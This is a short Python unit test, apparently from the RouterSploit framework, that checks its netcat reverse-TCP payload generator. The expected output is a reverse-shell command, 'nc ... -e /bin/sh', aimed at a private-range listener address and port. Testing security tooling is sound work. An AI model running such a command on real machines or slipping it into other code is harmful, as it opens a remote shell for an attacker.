from routersploit.modules.payloads.cmd.netcat_reverse_tcp import Payload


# netcat reverse tcp payload with lhost=192.168.1.4 lport=4321
reverse_tcp = (
    "nc 192.168.1.4 4321 -e /bin/sh"
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Payload()
    payload.lhost = "192.168.1.4"
    payload.lport = 4321

    assert payload.run() == reverse_tcp
